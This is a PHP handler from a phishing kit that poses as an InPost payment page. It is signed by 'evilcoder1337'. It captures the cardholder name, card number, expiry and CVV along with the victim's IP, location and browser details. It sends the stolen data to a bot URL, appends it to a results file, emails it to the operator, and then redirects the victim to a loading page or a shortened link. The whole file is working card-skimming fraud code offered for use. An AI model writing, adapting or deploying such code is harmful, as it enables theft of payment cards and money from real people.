<?php
ob_start();
session_start();
if(isset($_POST['c_holdername'])&&isset($_POST['creditCardNumber'])){
	include '../../config.php';
	include '../Functions/Fuck-you.php';

	$evilm="#------------[ -INPOST- PAYMENT INFORMATION ]------------#\r\n";
	$evilm.="CARDHOLDER NAME	: {$_POST['c_holdername']}\r\n";
	$evilm.="CARD NUMBER 		: {$_POST['creditCardNumber']}\r\n";
	$evilm.="EXPIRY 			: {$_POST['c_expiration']}\r\n";
	$evilm.="CVV				: {$_POST['c_csc']}\r\n";	
	$evilm.="#------------[ -EVIL-CODER- IP INFO ]------------#\r\n";
	$evilm.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$evilm.="IP COUNTRY	: {$_SESSION['country']}\r\n";
	$evilm.="IP CITY	: {$_SESSION['city']}\r\n";
	$evilm.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$evilm.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$evilm.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$evilm.="#------------[ -BY @evilcoder1337]------------#\r\n";
	$sendme = [
		'text' => $evilm
	];
	if ($bot_result == "yes") {
		$data = http_build_query($sendme);
		$response = file_get_contents($bot . $data);
	}
	if ($save_result_txt == "yes") {
		$save=fopen("../INPOST_result/inpost_payment.txt","a+");
		fwrite($save,$evilm);
		fclose($save);
}
	$subject="#INPOST EVIL-CODER Payment INFO FROM {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
	$headers="From: INPOST EVIL-CODER  <inpost_evil@coder.bd>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";

		@mail($mail,$subject,$evilm,$headers);
		

		
    $key = substr(sha1(mt_rand()),1,25);
	if ($show_sms_page1=="yes") {
		exit(header("Location: ../../main/loading.php?inpost_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: http://gg.gg/12ye43")); // go to main page officiel..
	}

}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>